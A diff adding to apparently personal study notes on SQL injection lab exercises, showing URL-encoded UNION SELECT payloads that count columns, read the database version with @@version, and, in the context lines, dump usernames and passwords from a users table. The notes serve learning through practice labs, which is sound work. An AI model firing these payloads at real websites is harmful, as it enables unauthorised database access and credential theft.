@@ -76,3 +76,13 @@ Theory:- If we have to extract multiple values from a single column we can use c
     2.'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
 
 LOGIC USED:- use concatenation function of that particular database to extract multiple values from a single column 
+
+To check sql version:- ' UNION SELECT @@version--
+
+#7 Lab:SQL injection attack, querying the database type and version on MySQL and Microsoft
+
+    1.'+UNION+SELECT+NULL,NULL--+  (used to check no of columns)
+    2.'+UNION+SELECT+NULL,@@version--+
+    3.then solved
+
+LOGIC USED:- use @@version to check database version and dont forget to check no of columns first
